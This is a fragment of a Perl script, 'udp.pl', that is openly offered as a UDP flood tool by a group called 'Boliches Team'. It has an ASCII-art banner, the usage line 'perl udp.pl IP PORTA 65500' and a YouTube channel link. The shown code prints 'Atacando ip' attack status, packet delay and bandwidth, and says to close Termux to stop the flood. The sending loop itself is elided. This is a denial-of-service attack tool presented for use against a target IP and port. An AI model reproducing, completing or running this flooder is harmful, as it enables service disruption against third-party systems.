...
____
     /\                                 / __ \
    /  \  _   _  __ _ _ __   ___ ______| |  | |_      ___ __   __ _
   / /\ \| | | |/ _` | '_ \ / _ \______| |  | \ \ /\ / / '_ \ / _` |
  / ____ \ |_| | (_| | | | | (_) |     | |__| |\ V  V /| | | | (_| |
 /_/    \_\__, |\__,_|_| |_|\___/       \____/  \_/\_/ |_| |_|\__,_|
           __/ |
          |___/


 udp.pl Criado por SrAyanokoji

 udp oficial da Boliches Team

 Para utilizar use:
 perl udp.pl IP PORTA 65500

 https://www.youtube.com/channel/UCmrClM0hRkrC-siAW4_kLVw
...
print "Atacando ip: $ip " . ($port ? $port : "By:") . " SrAyanokoji " . 
  ($size ? "$size-byte" : "UDP Oficial da: Boliches Team") . " https://www.youtube.com/channel/UCmrClM0hRkrC-siAW4_kLVw" . ($time ? " for $time seconds" : "") . "\n";
print "Interpacket delay $delay msec\n" if $delay;
print "total IP bandwidth $bw kbps\n" if $bw;
print "Para parar FECHE O TERMUX \n" unless $time;
